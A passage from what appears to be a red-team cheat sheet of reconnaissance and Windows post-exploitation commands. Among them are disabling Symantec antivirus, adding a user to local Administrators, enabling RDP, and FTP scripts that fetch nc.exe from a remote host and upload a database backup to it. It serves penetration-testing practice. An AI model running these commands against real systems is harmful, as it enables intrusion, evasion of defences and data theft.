<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">ChrisTruncer</span><span class="o">/</span><span class="n">EyeWitness</span><span class="p">.</span><span class="n">git</span>
</pre></div>
</td></tr></table></p>
<p>Faster Scan
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="p">.</span><span class="o">/</span><span class="n">EyeWitness</span><span class="p">.</span><span class="n">py</span> <span class="c1">--web -f hosts.txt --timeout 5 --threads 10 -d /mnt/event/Recon/ew --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https</span>
</pre></div>
</td></tr></table></p>
<p>Slow version via proxychains
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">proxychains</span> <span class="p">.</span><span class="o">/</span><span class="n">EyeWitness</span><span class="p">.</span><span class="n">py</span> <span class="c1">--web -f hosts.txt --timeout 10 --threads 2 -d /mnt/event/Recon/ew --no-dns --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https</span>

    <span class="n">proxychains</span> <span class="p">.</span><span class="o">/</span><span class="n">EyeWitness</span><span class="p">.</span><span class="n">py</span> <span class="c1">--web -x nmaphosts.xml --timeout 10 --threads 2 -d /mnt/event/Recon/ew2 --no-dns --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https</span>
</pre></div>
</td></tr></table></p>
<p>Proxychains specify a remote DNS server</p>
<p><a href="http://carnal0wnage.attackresearch.com/2013/09/changing-proxychains-hardcoded-dns.html">http://carnal0wnage.attackresearch.com/2013/09/changing-proxychains-hardcoded-dns.html</a>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">On</span> <span class="nv">Kali</span> <span class="nv">linux</span> <span class="nv">its</span> <span class="nv">found</span> <span class="nv">here</span>: <span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">proxychains3</span><span class="o">/</span><span class="nv">proxyresolv</span>

        #<span class="o">!/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">sh</span>
        # <span class="nv">This</span> <span class="nv">script</span> <span class="nv">is</span> <span class="nv">called</span> <span class="nv">by</span> <span class="nv">proxychains</span> <span class="nv">to</span> <span class="nv">resolve</span> <span class="nv">DNS</span> <span class="nv">names</span>
        # <span class="nv">DNS</span> <span class="nv">server</span> <span class="nv">used</span> <span class="nv">to</span> <span class="nv">resolve</span> <span class="nv">names</span>
        <span class="nv">DNS_SERVER</span><span class="o">=</span><span class="mi">4</span>.<span class="mi">2</span>.<span class="mi">2</span>.<span class="mi">2</span>

        <span class="k">if</span> [ $# <span class="o">=</span> <span class="mi">0</span> ] <span class="c1">; then</span>
         <span class="nv">echo</span> <span class="s2">&quot;</span><span class="s"> usage:</span><span class="s2">&quot;</span>
         <span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">  proxyresolv &lt;hostname&gt; </span><span class="s2">&quot;</span>
         <span class="k">exit</span>
        <span class="nv">fi</span>

        <span class="nv">export</span> <span class="nv">LD_PRELOAD</span><span class="o">=</span><span class="nv">libproxychains</span>.<span class="nv">so</span>.<span class="mi">3</span>
        <span class="nv">dig</span> <span class="mh">$1</span> @<span class="mh">$D</span><span class="nv">NS_SERVER</span> <span class="o">+</span><span class="nv">tcp</span> <span class="o">|</span> <span class="nv">awk</span> <span class="s1">&#39;</span><span class="s">/A.+[0-9]+\.[0-9]+\.[0-9]/{print $5;}</span><span class="s1">&#39;</span>
</pre></div>
</td></tr></table></p>
<p><em>Use Canary tokens to identify web front-end vulnerabilities</em></p>
<p>In combination with Burp collaborator, identify configuration issues with web front-end appliances </p>
<p>For example, issue request to target domain with a custom Host header pointing to your collaborator/canary:</p>
<p>Request:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">GET</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span>
    <span class="k">Host</span><span class="p">:</span> <span class="n">uniqid</span><span class="p">.</span><span class="n">burpcollaborator</span><span class="p">.</span><span class="n">net</span>
    <span class="k">Connection</span><span class="p">:</span> <span class="k">close</span>
</pre></div>
</td></tr></table></p>
<p>Response (on Collaborator):
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">GET</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span>
    <span class="k">Host</span><span class="p">:</span> <span class="n">XX</span><span class="p">.</span><span class="n">X</span><span class="p">.</span><span class="n">XXX</span><span class="p">.</span><span class="n">XX</span><span class="p">:</span><span class="mi">8082</span>


    <span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span> <span class="mi">200</span> <span class="k">Connection</span> <span class="n">Established</span>
    <span class="nb">Date</span><span class="p">:</span> <span class="n">Tue</span><span class="p">,</span> <span class="mi">07</span> <span class="n">Feb</span> <span class="mi">2017</span> <span class="mi">16</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">50</span> <span class="n">GMT</span>
    <span class="n">Transfer</span><span class="o">-</span><span class="k">Encoding</span><span class="p">:</span> <span class="n">chunked</span>
    <span class="k">Connection</span><span class="p">:</span> <span class="k">close</span>

    <span class="n">Ok</span>
    <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span> <span class="k">is</span> <span class="n">unavailable</span>
    <span class="n">Ok</span>
    <span class="k">Unknown</span> <span class="n">Command</span>
    <span class="n">Ok</span>
    <span class="k">Unknown</span> <span class="n">Command</span>
    <span class="n">Ok</span>
    <span class="k">Unknown</span> <span class="n">Command</span>
    <span class="n">Ok</span>
</pre></div>
</td></tr></table></p>
<p><a href="https://canarytokens.org/generate#">Canarytokens.org</a>
<a href="http://blog.portswigger.net/2017/07/cracking-lens-targeting-https-hidden.html">Blog - Targeting HTTP's Hidden Attack Surface</a></p>
<hr />
<h2 id="windows">Windows<a class="headerlink" href="#windows" title="Permanent link">&para;</a></h2>
<h3 id="built-in-commands">Built-in Commands<a class="headerlink" href="#built-in-commands" title="Permanent link">&para;</a></h3>
<p>View your current user:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">whoami</span>
</pre></div>
</td></tr></table></p>
<p>View information about the current user:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">net</span> <span class="nv">user</span> <span class="nv">myuser</span><span class="ss">(</span><span class="k">for</span> <span class="nv">a</span> <span class="nv">local</span> <span class="nv">user</span><span class="ss">)</span>
    <span class="nv">net</span> <span class="nv">user</span> <span class="nv">myuser</span> <span class="o">/</span><span class="nv">domain</span> <span class="ss">(</span><span class="k">for</span> <span class="nv">a</span> <span class="nv">domain</span> <span class="nv">user</span><span class="ss">)</span>
</pre></div>
</td></tr></table></p>
<p>View the local groups:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">net</span> <span class="n">localgroup</span>
</pre></div>
</td></tr></table></p>
<p>View the local administrators:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">net</span> <span class="n">localgroup</span> <span class="n">Administrators</span>
</pre></div>
</td></tr></table></p>
<p>Add a new user:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">net</span> <span class="k">user</span> <span class="n">myuser</span> <span class="n">mypass</span> <span class="o">/</span><span class="k">add</span>
</pre></div>
</td></tr></table></p>
<p>Add a user in the local Administrators group:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">net</span> <span class="n">localgroup</span> <span class="n">Administrators</span> <span class="n">myuser</span> <span class="o">/</span><span class="k">add</span>
</pre></div>
</td></tr></table></p>
<p>View the domain name of current machine:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">net</span> <span class="n">config</span> <span class="n">workstation</span>
    <span class="n">net</span> <span class="n">config</span> <span class="n">server</span>
</pre></div>
</td></tr></table></p>
<p>View the name of the domain controller: 
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">reg</span> <span class="n">query</span> <span class="ss">&quot;HKEY_LOCAL_MACHINE\ SOFTWARE\Microsoft\Windows\ CurrentVersion\Group Policy\ History&quot;</span> <span class="o">/</span><span class="n">v</span> <span class="n">DCName</span>
</pre></div>
</td></tr></table>
or
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="n">ActiveDirectory</span><span class="p">;</span> <span class="p">(</span><span class="k">Get</span><span class="o">-</span><span class="n">ADDomainController</span> <span class="o">-</span><span class="n">DomainName</span> <span class="n">corp</span><span class="p">.</span><span class="n">test</span><span class="p">.</span><span class="n">com</span> <span class="o">-</span><span class="n">Discover</span> <span class="o">-</span><span class="n">NextClosestSite</span><span class="p">).</span><span class="n">HostName</span>
</pre></div>
</td></tr></table>
or
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">set</span> <span class="n">l</span>
</pre></div>
</td></tr></table></p>
<p>Get list of DCs
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">nltest</span> <span class="o">/</span><span class="n">dclist</span><span class="p">:</span><span class="n">domainname</span>
</pre></div>
</td></tr></table>
or
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">netdom</span> <span class="n">query</span> <span class="o">/</span><span class="n">D</span><span class="p">:</span><span class="n">domin</span> <span class="n">DC</span>
</pre></div>
</td></tr></table>
or
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">dsquery</span> <span class="n">server</span>
</pre></div>
</td></tr></table>
or
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">nslookup</span> <span class="o">-</span><span class="k">type</span><span class="o">=</span><span class="n">srv</span> <span class="n">_ldap</span><span class="p">.</span><span class="n">_tcp</span><span class="p">.</span><span class="n">dc</span><span class="p">.</span><span class="n">_msdcs</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">test</span><span class="p">.</span><span class="n">com</span>
</pre></div>
</td></tr></table></p>
<p>Get DC Info
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">nltest</span> <span class="o">/</span><span class="n">dsgetdc</span><span class="p">:</span><span class="k">domain</span>
</pre></div>
</td></tr></table></p>
<p>Get DC site mapping
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">nltest</span> <span class="o">/</span><span class="n">dsaddresstosite</span><span class="p">:</span><span class="n">dcname</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">test</span><span class="p">.</span><span class="n">com</span>
</pre></div>
</td></tr></table></p>
<p>Get PDC
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">netdom</span> <span class="n">query</span> <span class="o">/</span><span class="n">D</span><span class="p">:</span><span class="k">domain</span> <span class="n">PDC</span>
</pre></div>
</td></tr></table>
or
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">nslookup</span> <span class="o">-</span><span class="k">type</span><span class="o">=</span><span class="n">srv</span> <span class="n">_ldap</span><span class="p">.</span><span class="n">_tcp</span><span class="p">.</span><span class="n">pdc</span><span class="p">.</span><span class="n">_msdcs</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">test</span><span class="p">.</span><span class="n">com</span>
</pre></div>
</td></tr></table>
or get roles</p>
<p>Get Roles
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">netdom</span> <span class="n">query</span> <span class="o">/</span><span class="n">D</span><span class="p">:</span><span class="k">domain</span> <span class="n">FSMO</span>
</pre></div>
</td></tr></table></p>
<p>List trusts
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="n">nltest</span> <span class="o">/</span><span class="n">domain_trust</span>
</pre></div>
</td></tr></table></p>
<p>or</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="n">nltest</span> <span class="o">/</span><span class="n">trusted_domains</span>
</pre></div>
</td></tr></table>

<p>or</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="k">get</span><span class="o">-</span><span class="n">adtrust</span> <span class="o">-</span><span class="n">Filter</span> <span class="o">*</span>
</pre></div>
</td></tr></table>

<p>Get DC for Trusted Domains
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="err">$</span><span class="n">t</span><span class="o">=</span><span class="k">Get</span><span class="o">-</span><span class="n">AdTrust</span> <span class="o">-</span><span class="n">Filter</span> <span class="o">*</span> <span class="o">|</span><span class="k">Select</span> <span class="o">-</span><span class="n">expandproperty</span> <span class="n">Name</span><span class="p">;</span><span class="n">foreach</span><span class="p">(</span><span class="err">$</span><span class="n">line</span> <span class="k">in</span> <span class="err">$</span><span class="n">t</span><span class="p">)</span><span class="err">{</span><span class="n">nltest</span> <span class="o">/</span><span class="n">dclist</span><span class="p">:</span><span class="err">$</span><span class="n">line</span><span class="err">}</span>
</pre></div>
</td></tr></table></p>
<p>View the list of domain users:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="w">    </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="o">&gt;</span><span class="w"> </span><span class="n">wmic</span><span class="w"> </span><span class="n">useraccount</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="p">(</span><span class="k">domain</span><span class="o">=</span><span class="s1">&#39;%USERDOMAIN%&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">get</span><span class="w"> </span><span class="n">Name</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">userlist</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>

<span class="w">    </span><span class="n">PS</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="o">&gt;</span><span class="w"> </span><span class="p">(</span><span class="o">[</span><span class="n">adsisearcher</span><span class="o">]</span><span class="ss">&quot;objectCategory=User&quot;</span><span class="p">).</span><span class="n">Findall</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach</span><span class="w"></span>
<span class="w">    </span><span class="err">{$</span><span class="n">_</span><span class="p">.</span><span class="n">properties</span><span class="p">.</span><span class="n">samaccountname</span><span class="err">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Sort</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Out</span><span class="o">-</span><span class="k">File</span><span class="w"> </span><span class="o">-</span><span class="n">Encoding</span><span class="w"> </span><span class="nf">ASCII</span><span class="w"> </span><span class="n">users</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
</pre></div>
</td></tr></table>
or
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">net</span> <span class="k">user</span> <span class="o">/</span><span class="k">domain</span>
</pre></div>
</td></tr></table></p>
<p>Get domain info (including DC)
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">gpresult</span> <span class="o">/</span><span class="n">z</span>
</pre></div>
</td></tr></table></p>
<p>View the list of domain admins:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">net</span> <span class="k">group</span> <span class="ss">&quot;Domain Admins&quot;</span> <span class="o">/</span><span class="k">domain</span>
</pre></div>
</td></tr></table></p>
<p>View domain groups
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">net</span> <span class="k">group</span> <span class="o">/</span><span class="k">domain</span>
    <span class="n">powershell</span> <span class="p">(</span><span class="k">new</span><span class="o">-</span><span class="k">object</span> <span class="k">system</span><span class="p">.</span><span class="n">directoryservices</span><span class="p">.</span><span class="n">directorysearcher</span><span class="p">(</span><span class="ss">&quot;(&amp;(objectcategory=user)(samaccountname=$($env:username)))&quot;</span><span class="p">)).</span><span class="n">FindOne</span><span class="p">().</span><span class="n">GetDirectoryEntry</span><span class="p">().</span><span class="n">memberof</span>
</pre></div>
</td></tr></table></p>
<p>View the list of started services (search for antivirus):
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">net</span> <span class="k">start</span>
    <span class="n">sc</span> <span class="n">query</span>
</pre></div>
</td></tr></table></p>
<p>Stop a service: 
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">net</span> <span class="n">stop</span> <span class="ss">&quot;Symantec Endpoint Protection&quot;</span>
</pre></div>
</td></tr></table></p>
<p>View the list of started processes and the owner:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">tasklist</span> <span class="o">/</span><span class="n">v</span>
</pre></div>
</td></tr></table></p>
<p>Kill a process by its name: 
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">taskkill</span> <span class="o">/</span><span class="n">F</span> <span class="o">/</span><span class="n">IM</span> <span class="ss">&quot;cmd.exe&quot;</span>
</pre></div>
</td></tr></table></p>
<p>Abort a shutdown/restart countdown: 
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">shutdown</span> <span class="o">/</span><span class="n">a</span>
</pre></div>
</td></tr></table></p>
<p>Download an executable from a remote FTP server:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">echo</span> <span class="k">open</span> <span class="mi">10</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="o">&gt;</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">script</span><span class="p">.</span><span class="n">txt</span>
    <span class="n">echo</span> <span class="k">user</span> <span class="n">myftpuser</span><span class="o">&gt;&gt;</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">script</span><span class="p">.</span><span class="n">txt</span>
    <span class="n">echo</span> <span class="n">pass</span> <span class="n">myftppass</span><span class="o">&gt;&gt;</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">script</span><span class="p">.</span><span class="n">txt</span>
    <span class="n">echo</span> <span class="k">get</span> <span class="n">nc</span><span class="p">.</span><span class="n">exe</span><span class="o">&gt;&gt;</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">script</span><span class="p">.</span><span class="n">txt</span>
    <span class="n">echo</span> <span class="n">bye</span><span class="o">&gt;&gt;</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">script</span><span class="p">.</span><span class="n">txt</span>
    <span class="n">ftp</span> <span class="o">-</span><span class="n">s</span><span class="p">:</span><span class="n">script</span><span class="p">.</span><span class="n">txt</span>
</pre></div>
</td></tr></table></p>
<p>Upload a file to a remote FTP server:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">echo</span> <span class="k">open</span> <span class="mi">10</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="o">&gt;</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">script</span><span class="p">.</span><span class="n">txt</span>
    <span class="n">echo</span> <span class="k">user</span> <span class="n">myftpuser</span><span class="o">&gt;&gt;</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">script</span><span class="p">.</span><span class="n">txt</span>
    <span class="n">echo</span> <span class="n">pass</span> <span class="n">myftppass</span><span class="o">&gt;&gt;</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">script</span><span class="p">.</span><span class="n">txt</span>
    <span class="n">echo</span> <span class="n">put</span> <span class="n">E</span><span class="p">:</span><span class="err">\</span><span class="n">backups</span><span class="err">\</span><span class="k">database</span><span class="p">.</span><span class="n">dbf</span><span class="o">&gt;&gt;</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">script</span><span class="p">.</span><span class="n">txt</span>
    <span class="n">echo</span> <span class="n">bye</span><span class="o">&gt;&gt;</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">script</span><span class="p">.</span><span class="n">txt</span>
    <span class="n">ftp</span> <span class="o">-</span><span class="n">s</span><span class="p">:</span><span class="n">script</span><span class="p">.</span><span class="n">txt</span>
</pre></div>
</td></tr></table></p>
<p>WMI call remote system
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">wmic</span> <span class="o">/</span><span class="n">node</span><span class="p">:</span><span class="n">remote_computer</span> <span class="n">process</span> <span class="k">call</span> <span class="k">create</span> <span class="ss">&quot;netstat.exe -ano &gt; C:\output.txt&quot;</span>
</pre></div>
</td></tr></table></p>
<p>WMI get startup items
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">wmic</span> <span class="n">startup</span> <span class="k">get</span> <span class="n">Caption</span><span class="p">,</span> <span class="n">Command</span><span class="p">,</span> <span class="k">User</span>
</pre></div>
</td></tr></table></p>
<p>or</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">wmic</span> <span class="n">startup</span> <span class="n">list</span> <span class="k">full</span>
</pre></div>
</td></tr></table>

<p>WMI get enabled account password expiration
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">wmic</span> <span class="n">useraccount</span> <span class="k">where</span> <span class="ss">&quot;disabled=0 AND localaccount=1&quot;</span> <span class="k">get</span> <span class="n">name</span><span class="p">,</span> <span class="n">passwordexpires</span> <span class="o">/</span><span class="n">value</span>
</pre></div>
</td></tr></table></p>
<p>View established connections of current machine:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">netstat</span> <span class="o">-</span><span class="n">a</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">p</span> <span class="n">tcp</span> <span class="o">|</span> <span class="n">find</span> <span class="ss">&quot;ESTAB&quot;</span>
</pre></div>
</td></tr></table></p>
<p>View open ports of current machine: 
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">netstat</span> <span class="o">-</span><span class="n">a</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">p</span> <span class="n">tcp</span> <span class="o">|</span> <span class="n">find</span> <span class="ss">&quot;LISTEN&quot;</span>
</pre></div>
</td></tr></table></p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">netstat</span> <span class="o">-</span><span class="n">a</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">p</span> <span class="n">udp</span>
</pre></div>
</td></tr></table>

<p>View network configuration:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">netsh</span> <span class="nv">interface</span> <span class="nv">ip</span> <span class="k">show</span> <span class="nv">addresses</span>
    <span class="nv">netsh</span> <span class="nv">interface</span> <span class="nv">ip</span> <span class="k">show</span> <span class="nv">route</span>
    <span class="nv">netsh</span> <span class="nv">interface</span> <span class="nv">ip</span> <span class="k">show</span> <span class="nv">neighbors</span>
</pre></div>
</td></tr></table></p>
<p>View current network shares:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">net</span> <span class="k">share</span>
</pre></div>
</td></tr></table></p>
<p>Mount a remote share with the rights of the current user:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">net</span> <span class="n">use</span> <span class="n">K</span><span class="p">:</span> <span class="err">\\</span><span class="mi">10</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="err">\</span><span class="k">C</span><span class="err">$</span>
</pre></div>
</td></tr></table></p>
<p>Enable Remote Desktop:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">reg</span> <span class="k">add</span> <span class="ss">&quot;HKLM\System\CurrentControlSet\Control\Terminal Server&quot;</span> <span class="o">/</span><span class="n">v</span> <span class="n">fDenyTSConnections</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="o">/</span><span class="n">d</span> <span class="mi">0</span> <span class="o">/</span><span class="n">f</span>
</pre></div>
</td></tr></table></p>
<p>One-Liner Windows Enumeration
Reference: <a href="https://gist.github.com/KyleHanslovan/cadf9737401b85422c84091855473eb7">https://gist.github.com/KyleHanslovan/cadf9737401b85422c84091855473eb7</a>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">whoami</span> <span class="o">&amp;</span> <span class="n">hostname</span> <span class="o">&amp;</span> <span class="n">ipconfig</span> <span class="o">/</span><span class="k">all</span> <span class="o">&amp;</span> <span class="n">net</span> <span class="k">user</span> <span class="o">/</span><span class="k">domain</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">&amp;</span> <span class="n">net</span> <span class="k">group</span> <span class="o">/</span><span class="k">domain</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">&amp;</span> <span class="n">net</span> <span class="k">group</span> <span class="ss">&quot;domain admins&quot;</span> <span class="o">/</span><span class="k">domain</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">&amp;</span> <span class="n">net</span> <span class="k">group</span> <span 